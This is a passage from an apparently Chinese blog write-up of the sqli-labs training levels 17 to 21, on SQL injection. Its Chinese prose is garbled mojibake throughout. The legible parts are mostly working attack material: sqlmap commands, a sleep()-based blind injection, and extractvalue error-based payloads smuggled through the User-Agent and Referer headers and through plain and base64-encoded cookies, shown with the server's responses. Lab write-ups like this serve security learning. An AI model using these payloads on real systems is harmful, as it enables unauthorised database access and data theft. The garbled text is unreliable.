å€¼æŠŠæ•°æ®åº“åæ‹–å‡ºæ¥ï¼Œçˆ†å­—æ®µå‚è€ƒ less-11</p><table><thead><tr><th>request</th><th>payload1</th><th>payload2</th><th>status</th><th>timeout</th><th>error</th><th>length</th><th></th></tr></thead><tbody><tr><td>787</td><td>3</td><td>99</td><td>200</td><td>false</td><td>false</td><td>1712</td><td></td></tr><tr><td>802</td><td>2</td><td>101</td><td>200</td><td>false</td><td>false</td><td>1712</td><td></td></tr><tr><td>838</td><td>6</td><td>105</td><td>200</td><td>false</td><td>false</td><td>1712</td><td></td></tr><tr><td>909</td><td>5</td><td>114</td><td>200</td><td>false</td><td>false</td><td>1712</td><td></td></tr><tr><td>913</td><td>1</td><td>115</td><td>200</td><td>false</td><td>false</td><td>1712</td><td></td></tr><tr><td>927</td><td>7</td><td>116</td><td>200</td><td>false</td><td>false</td><td>1712</td><td></td></tr><tr><td>932</td><td>4</td><td>117</td><td>200</td><td>false</td><td>false</td><td>1712</td><td></td></tr><tr><td>968</td><td>8</td><td>121</td><td>200</td><td>false</td><td>false</td><td>1712</td><td></td></tr><tr><td>0</td><td></td><td></td><td>200</td><td>false</td><td>false</td><td>1749</td><td></td></tr><tr><td>1</td><td>1</td><td>1</td><td>200</td><td>false</td><td>false</td><td>1749</td><td></td></tr></tbody></table><h2 id="æ€»ç»“-16"><a class="markdownIt-Anchor" href="#æ€»ç»“-16">#</a> æ€»ç»“</h2><p>bp çœŸå¥½ï¼Œsqlmap çœŸå¥½ï¼Œæ¬ç –çœŸéš¾</p><hr><h1 id="less-17sqlmaping"><a class="markdownIt-Anchor" href="#less-17sqlmaping">#</a> Less-17ï¼ˆsqlmapingï¼‰</h1><p>dateï¼š2020-11-21 22:54:56</p><h2 id="è¿‡ç¨‹-17"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-17">#</a> è¿‡ç¨‹</h2><p>çœ‹è§é¢˜ç›®åˆå¼€å¿ƒäº†èµ·æ¥ï¼Œä¸æ˜¯ç›²æ³¨å•¦</p><h3 id="sqlmap-17"><a class="markdownIt-Anchor" href="#sqlmap-17">#</a> sqlmap</h3><p>bp æŠ“åŒ…å³é”® copy to file ç”Ÿæˆ 17.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 17.txt --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure><p>åç»­åŒ less-11</p><h3 id="æ‰‹å·¥æ³¨å…¥-17"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-17">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>username è¾“å…¥ <code>admin' or 1=1 -- </code></p><p>ç«Ÿç„¶è¿”å› bug offï¼Œyou silly dump hacker</p><p>å“¦è±ï¼Œéª‚æˆ‘ï¼Œæˆ‘è¦å¹²ä½ ï¼Œç­‰ç€</p><p>æˆ‘æ€€ç–‘åå°åˆ¤æ–­äº†ç”¨æˆ·è¾“å…¥ï¼Œç„¶åæ— æ•°æ¬¡å°è¯•æ— æ•°æ¬¡è¢«éª‚ï¼Œæˆ‘å†³å®šå·å·çœ‹ä¸€ä¸‹æºç </p><p>æºç ä¸­å¯¹ uname é™åˆ¶äº†åªèƒ½ 15 ä¸ªå­—ç¬¦ï¼Œå•æ˜¯è¿™ä¸ªå°±å·²ç»å¾ˆæ— åŠ›äº†ï¼Œåæ¥çœ‹å®Œæºç æ‰å‘ç°è¿™æ˜¯ä¸€ä¸ªé‡ç½®å¯†ç çš„è¡¨å•ï¼Œè€Œä¸”æºç ä¸­å¹¶æ²¡æœ‰å¯¹ passwd åšé™åˆ¶</p><p>çœ¼ççš„æˆ‘å†³å®šç”¨æ—¶é—´ç›²æ³¨ï¼Œbp send to repeaterï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&#x27; where 1=1 and if( length(database())=8,sleep(10),1 )--+&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>å“ˆå“ˆ æœåŠ¡å™¨ç¡ç€å•¦ï¼Œéšåæ—¶é—´ç›²æ³¨å°±å¯ä»¥äº†ï¼Œå’Œä¸Šé¢çš„é¢˜ç›®ä¸€æ ·</p><h2 id="æ€»ç»“-17"><a class="markdownIt-Anchor" href="#æ€»ç»“-17">#</a> æ€»ç»“</h2><p>æ„Ÿè§‰ç”¨å¾—å¤šçš„è¿˜æ˜¯ç›²æ³¨</p><p>ç›²æ³¨æ‰‹å·¥æ³¨å…¥æœ€å¿«å°±æ˜¯ç”¨äºŒåˆ†æ³•ï¼Œä½†æ˜¯æˆ‘æ˜¯æœ‰ bp çš„äººï¼</p><ol><li>â€“risk=RISK é£é™©ï¼ˆ1-4ï¼Œé»˜è®¤ 1ï¼‰å‡é«˜é£é™©ç­‰çº§ä¼šå¢åŠ æ•°æ®è¢«ç¯¡æ”¹çš„é£é™©ã€‚risk 2ï¼šåŸºäºäº‹ä»¶çš„æµ‹è¯•ï¼›risk 3ï¼šor è¯­å¥çš„æµ‹è¯•ï¼›risk 4ï¼šupdate çš„æµ‹è¯•</li></ol><hr><h1 id="less-18"><a class="markdownIt-Anchor" href="#less-18">#</a> Less-18</h1><p>dateï¼š2020-11-22 00:19:07</p><h2 id="è¿‡ç¨‹-18"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-18">#</a> è¿‡ç¨‹</h2><p>é¢˜ç›®æç¤ºï¼ŒYour IP ADDRESS is: 127.0.0.1ï¼Œè¿™é¢˜æˆ‘ä¼šï¼è‚¯å®šæ˜¯ xff å¤´æ³¨å…¥ï¼ï¼ˆç»“æœä¸æ˜¯ï¼‰</p><h3 id="sqlmap-18"><a class="markdownIt-Anchor" href="#sqlmap-18">#</a> sqlmap</h3><p>bp æŠ“åŒ…å³é”® copy to file ç”Ÿæˆ 18.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 18.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure><p>åç»­åŒ less-11</p><h3 id="æ‰‹å·¥æ³¨å…¥-18"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-18">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>æ—¢ç„¶ä¸æ˜¯ xff å¤´ï¼Œé‚£å°±çœ‹ä¸€ä¸‹æºç æŠŠ</p><p>æºç ä¸­å¯¹è´¦æˆ·å¯†ç è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¿…é¡»è¦ç»•è¿‡å»æ‰èƒ½è¿›è¡Œå¤´æ³¨å…¥ï¼Œåˆšå¥½ä¸Šä¸€é¢˜é‡ç½®äº†å¯†ç </p><p>é‚£ä¹ˆå°±è¾“å…¥ç›¸åº”çš„è´¦æˆ·å¯†ç ï¼Œå†åœ¨ user-agent ä¸Šæ³¨å…¥å°±å¥½å•¦ï¼Œå…ˆæ¥ä¸ªå•å¼•å·æŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;&lt;/font&gt;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;, &#x27;admin&#x27;)&#x27; at line 1&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure><p>è®²é“ç†è¿™é‡Œè‚¯å®šæ˜¯æ’å…¥æ“ä½œï¼Œé‚£å°±æ˜¯ insert æ³¨å…¥å’¯ï¼Œæºç ç¡®å®æ˜¯ insertï¼Œå…¶å®ä¸ç®¡æ˜¯ä»€ä¹ˆæ³¨å…¥ï¼Œåªè¦èƒ½å¤§æ¦‚å¼„ sql è¯­å¥ï¼Œé¡ºåˆ©è®©æ•°æ®åº“æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç å³å¯</p><p>æ‹¿ database () è¿™é‡Œåˆ©ç”¨æŠ¥é”™æ³¨å…¥ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;,1,extractvalue(1,concat(&#x27;~&#x27;,database())))# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼Œæ‹¿åˆ°å½“å‰æ•°æ®åº“ securityï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;,1,extractvalue(1,concat(&#x27;~&#x27;,database())))#&lt;/font&gt;&lt;br&gt;XPATH syntax error: &#x27;~security&#x27;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure><p>åé¢çˆ†å­—æ®µå€¼åŒ less-11ï¼Œæ”¹ä¸€ä¸‹ payload å³å¯</p><h2 id="æ€»ç»“-18"><a class="markdownIt-Anchor" href="#æ€»ç»“-18">#</a> æ€»ç»“</h2><p>çœ‹æºç ï¼Œå°±åƒè€ƒè¯•ä½œå¼Šï¼Œå¿ƒæ€€æ„§ç–šï½ï½ï¼ˆè·ƒè·ƒæ¬²è¯•ï¼‰~~</p><ol><li>level å‚æ•°ï¼š</li></ol><blockquote><p>1 &gt; æ¢æµ‹ç­‰çº§ï¼š --level 5</p><p>â€“level 5 æŒ‡çš„æ˜¯éœ€è¦æ‰§è¡Œçš„æµ‹è¯•ç­‰çº§</p><p>ä¸€å…±æœ‰ 5 ä¸ªç­‰çº§ï¼ˆ1-5ï¼‰ ä¸åŠ  level æ—¶ï¼Œé»˜è®¤æ˜¯ 1</p><p>5 çº§åŒ…å«çš„ payload æœ€å¤šï¼Œä¼šè‡ªåŠ¨ç ´è§£å‡º cookieã€XFF ç­‰å¤´éƒ¨æ³¨å…¥ï¼Œç›¸å¯¹åº”ä»–çš„é€Ÿåº¦ä¹Ÿæ¯”è¾ƒæ…¢ã€‚</p><p>level=2 http cookie ä¼šæµ‹è¯•</p><p>level=3 http user-agent/referer å¤´ä¼šæµ‹è¯•</p><p>åœ¨ä¸èƒ½ç¡®å®šå“ªä¸ª payload æˆ–å‚æ•°ä¸ºæ³¨å…¥ç‚¹æ—¶ï¼Œå»ºè®®ä½¿ç”¨é«˜çš„ level å€¼ã€‚</p></blockquote><hr><h1 id="less-19"><a class="markdownIt-Anchor" href="#less-19">#</a> Less-19</h1><p>dateï¼š2020-11-22 10:01:30</p><h2 id="è¿‡ç¨‹-19"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-19">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-19"><a class="markdownIt-Anchor" href="#sqlmap-19">#</a> sqlmap</h3><p>bp æŠ“åŒ…å³é”® copy to file ç”Ÿæˆ 19.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 19.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure><p>åç»­åŒ less-11</p><h3 id="æ‰‹å·¥æ³¨å…¥-19"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-19">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>çœ‹æ ‡é¢˜ï¼Œreferer æ³¨å…¥ï¼Œçœ‹æ¥åé¢çš„é¢˜ç›®éƒ½æ˜¯å¤´æ³¨å…¥äº†</p><p>æ‰“å¼€ hackbarï¼Œç‚¹å‡» post dataï¼Œè¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå¯†ç ï¼Œæç¤ºæˆ‘çš„ referer æ˜¯å•¥å•¥å•¥ï¼Œå†æ¬¡ç¡®å®šå°±æ˜¯ referer å¤´æ³¨å…¥</p><p>ä¸çŸ¥é“ä¸ºå•¥ hackbar åŒæ—¶æ postdata å’Œ refererï¼Œreferer æ²¡æœ‰èµ·ä½œç”¨ï¼Œä¸Š bpï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&#x27;Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://www.sqli-labs.com/Less-19/&#x27;&lt;/font&gt;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;)&#x27; at line 1&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure><p>åˆæ˜¯ insert æ“ä½œå•¦ï¼Œåˆ©ç”¨æŠ¥é”™æ³¨å…¥ extractvalue () æ‹¿å½“å‰æ•°æ®åº“å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&#x27;, extractvalue(1,concat(&#x27;~&#x27;,database()))) # Content-Type: application/x-www-form-urlencodedContent-Length: 35Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit </span><br></pre></td></tr></table></figure><p>æ ¹æ®è¾“å‡ºï¼Œæ‹¿åˆ°å½“å‰æ•°æ®åº“å securityï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://www.sqli-labs.com/Less-19/&#x27;, extractvalue(1,concat(&#x27;~&#x27;,database()))) #&lt;/font&gt;&lt;br&gt;XPATH syntax error: &#x27;~security&#x27;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure><p>åç»­æ“ä½œåŒ less-11</p><h2 id="æ€»ç»“-19"><a class="markdownIt-Anchor" href="#æ€»ç»“-19">#</a> æ€»ç»“</h2><p>sqlmap æ–°æ“ä½œï¼Œæ„Ÿè§‰å®ƒä¸å¤ªè¡Œäº†ï¼Ÿåº”è¯¥æ˜¯æˆ‘ä¸å¤ªè¡Œï¼Œå»ç™¾åº¦ sqlmap çš„ä½¿ç”¨å§¿åŠ¿</p><hr><h1 id="less-20"><a class="markdownIt-Anchor" href="#less-20">#</a> Less-20</h1><p>dateï¼š2020-11-22 10:17:02</p><h2 id="è¿‡ç¨‹-20"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-20">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-20"><a class="markdownIt-Anchor" href="#sqlmap-20">#</a> sqlmap</h3><p>bp æŠ“åŒ…å³é”® copy to file ç”Ÿæˆ 20.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure><p>åç»­åŒ less-11</p><h3 id="æ‰‹å·¥æ³¨å…¥-20"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-20">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>å…ˆç”¨ admin\1 ç™»å½•</p><p>é¢˜ç›®ç»™äº†æˆ‘çš„ cookieï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = admin and expires: Sun 22 Nov 2020 - 11:22:50Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure><p>é‚£å°± cookie æ³¨å…¥å‘—ï¼Œbp æŠ“åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /Less-20/index.php HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-20/index.phpDNT: 1Connection: closeCookie: uname=adminUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure><p>cookie åå•å¼•å·å¼€æˆ˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&#x27;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>åé¢çš„ sql æ©˜å­æ‹¿åˆ°äº†ï¼Œå°±å¼€å§‹å¸¸è§„å§¿åŠ¿é—­åˆï¼Œæ‹¿ database ()</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&#x27; and extractvalue(1,concat(&#x27;~&#x27;,database())) # </span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼Œæ‹¿åˆ°åº“å securityï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Issue with your mysql: XPATH syntax error: &#x27;~security&#x27;</span><br></pre></td></tr></table></figure><p>æ‹¿å­—æ®µå†…å®¹åŒ less-11</p><h2 id="æ€»ç»“-20"><a class="markdownIt-Anchor" href="#æ€»ç»“-20">#</a> æ€»ç»“</h2><p>æŠ¥é”™æ³¨å…¥çœŸå¥½ç”¨</p><p>å‰é¢å†™äº†é¢˜ï¼Œåé¢å°±è¶Šå†™è¶Šå¿«äº†ï¼Œå¼€å¿ƒ</p><hr><h1 id="less-21"><a class="markdownIt-Anchor" href="#less-21">#</a> Less-21</h1><p>dateï¼š2020-11-22 10:29:18</p><h2 id="è¿‡ç¨‹-21"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-21">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-21"><a class="markdownIt-Anchor" href="#sqlmap-21">#</a> sqlmap</h3><p>bp æŠ“åŒ…å³é”® copy to file ç”Ÿæˆ 21.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure><p>åç»­åŒ less-11</p><h3 id="æ‰‹å·¥æ³¨å…¥-21"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-21">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>è€è§„çŸ©ï¼Œè¾“å…¥ 17 å…³é‡ç½®åçš„è´¦æˆ·å¯†ç  admin/1</p><p>é¢˜ç›®è¿˜æ˜¯ cookie æ³¨å…¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 11:29:55Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure><p>çœ‹æ ‡é¢˜æ˜¯å¤æ‚ç‰ˆçš„â€¦</p><p>å•Šè¿™ï¼Œå…ˆè¯•è¯•å¼•å·ï¼Œç«Ÿç„¶ä¸æŠ¥é”™äº†ï¼</p><p>æœ‰è¶£</p><p>çœ‹äº†ä¸‹é¢˜ç›® uname é‚£é‡Œå‘ç”Ÿäº†æ”¹å˜ï¼ŒæŠ“åŒ…å‘ç° uname æ˜¯ YWRtaW4ï¼Œæ”¹æˆ admin è¯•è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&quot;</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation &#x27;=&#x27;</span><br></pre></td></tr></table></figure><p>è¯´æ˜¯ç¼–ç é›†çš„é—®é¢˜ï¼Œå¥½å­æˆ‘å»ç™¾åº¦<a href="https://www.cnblogs.com/escwq/p/12264076.html">é—¯å…³ç§˜ç±äº†</a></p><p>å¯¹ cookie çš„å€¼è¿›è¡Œäº† base64 çš„å¤„ç†ï¼Œå…¶ä»–å’Œ 20 å…³ä¸€æ ·</p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨æ³¨å…¥çš„æ—¶å€™éœ€è¦æŠŠæ³¨å…¥è¯­å¥æä¸€ä¸‹ç¼–ç ï¼Œæ‰“å¼€ hackbarï¼Œæ‰“å¼€ base64 ç¼–ç ï¼Œè¾“å…¥ adminâ€™</p><p>bp å‘åŒ…è®¾ç½® cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4n</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°åé¢çš„å¥å­ï¼Œå¼€å§‹é—­åˆæ³¨å…¥ï¼Œä¸çŸ¥ä¸ºä½•æˆ‘è½¬ä¹‰åçš„æŠ¥é”™æ³¨å…¥ä»£ç æ”¾è¿› payload æ²¡æœ‰ååº”ï¼Œæ¢ä¸€ä¸ªåŠ å¯†å·¥å…·å°±å¥½äº†</p><p>ç”¨æŠ¥é”™æ³¨å…¥æ‹¿æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ˜æ–‡ï¼šadmin&#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64è½¬ä¹‰ï¼šYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=è®¾ç½®cookieï¼šCookie: uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;YOUR COOKIE : uname = YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA= and expires: Sun 22 Nov 2020 - 12:30:51&lt;br&gt;&lt;/font&gt;Issue with your mysql: XPATH syntax error: &#x27;,security&#x27;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°æ•°æ®åº“åï¼Œæ‹¿åˆ«çš„æ•°æ®åŒ less-11</p><h2 id="æ€»ç»“-21"><a class="markdownIt-Anchor" href="#æ€»ç»“-21">#</a> æ€»ç»“</h2><p><a href="https://blog.csdn.net/makenothing/article/details/81155960">base64 ä½¿ç”¨åœºæ™¯åŠåŸç†</a></p><p>base64 æœ€æ—©å°±æ˜¯ç”¨æ¥é‚®ä»¶ä¼ è¾“åè®®ä¸­çš„ï¼ŒåŸå› æ˜¯é‚®ä»¶ä¼ è¾“åè®®åªæ”¯æŒ ascii å­—ç¬¦ä¼ é€’ï¼Œå› æ­¤å¦‚æœè¦ä¼ è¾“äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¦‚ï¼šå›¾ç‰‡ã€è§†é¢‘æ˜¯æ— æ³•å®ç°çš„ã€‚</p><p>å› æ­¤ base64 å°±å¯ä»¥ç”¨æ¥å°†äºŒè¿›åˆ¶æ–‡ä»¶å†…å®¹ç¼–ç ä¸ºåªåŒ…å« ascii å­—ç¬¦çš„å†…å®¹ã€‚</p><p>æˆ‘ä»¬çŸ¥é“åœ¨è®¡ç®—æœºä¸­ä»»ä½•æ•°æ®éƒ½æ˜¯æŒ‰ ascii ç å­˜å‚¨çš„ï¼Œè€Œ ascii ç çš„ 128ï½255 ä¹‹é—´çš„å€¼æ˜¯ä¸å¯è§å­—ç¬¦ã€‚è€Œåœ¨ç½‘ç»œä¸Šäº¤æ¢æ•°æ®æ—¶ï¼Œæ¯”å¦‚è¯´ä» A åœ°ä¼ åˆ° B 